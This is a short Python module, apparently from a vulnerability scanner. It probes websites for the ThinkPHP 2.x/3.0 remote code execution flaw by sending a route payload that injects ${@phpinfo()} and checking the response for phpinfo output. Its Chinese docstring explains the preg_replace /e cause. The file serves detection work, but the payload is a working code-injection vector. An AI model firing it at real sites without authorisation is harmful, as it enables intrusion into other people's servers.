#!/usr/bin/env python3
# -*- coding:utf-8 -*-

thinkphp_2_x_rce_payloads = [
    {'path': 'index.php?s=/index/index/name/$%7B@phpinfo()%7D'},
]

def rce_2_x_scan(clients):
    ''' ThinkPHP 2.x版本中, 使用preg_replace的/e模式匹配路由; 
            导致用户的输入参数被插入双引号中执行, 造成任意代码执行漏洞; 
            ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞, 也存在这个漏洞
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': 'ThinkPHP',
        'vul_type': 'RCE',
        'vul_id': 'thinkphp-2.x-rce',
    }

    for payload in thinkphp_2_x_rce_payloads:
        path = payload['path']

        res = client.request(
            'get',
            path,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (('PHP Version' in res.text) and ('PHP License' in res.text)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
